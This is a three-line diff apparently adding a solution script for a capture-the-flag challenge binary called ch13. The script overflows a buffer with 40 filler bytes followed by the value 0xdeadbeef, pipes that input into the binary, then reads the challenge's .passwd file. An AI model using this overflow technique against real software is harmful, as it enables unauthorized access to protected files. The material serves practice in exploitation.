@@ -1,0 +1,3 @@
+echo aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa$(printf '\xef\xbe\xad\xde') > /tmp/niark23.txt
+cat /tmp/niark23.txt - | ./ch13
+cat .passwd
